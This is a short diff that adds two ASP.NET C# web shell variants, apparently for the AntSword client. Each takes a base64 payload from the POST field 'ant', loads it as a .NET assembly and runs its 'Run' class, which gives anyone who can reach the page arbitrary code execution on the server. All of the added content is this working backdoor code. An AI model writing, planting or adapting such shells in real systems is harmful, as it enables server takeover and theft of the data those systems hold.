@@ -7,3 +7,25 @@
         assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(new object[] { Request, Response });
     }
 %>
+
+
+<%@ Page Language="c#"%>
+<%
+    String Payload = Request.Form["ant"];
+    if (Payload != null)
+    {
+        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
+        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(Context);
+    }
+%>
+
+
+<%@ Page Language="c#"%>
+<%
+    String Payload = Request.Form["ant"];
+    if (Payload != null)
+    {
+        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
+        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(null);
+    }
+%>
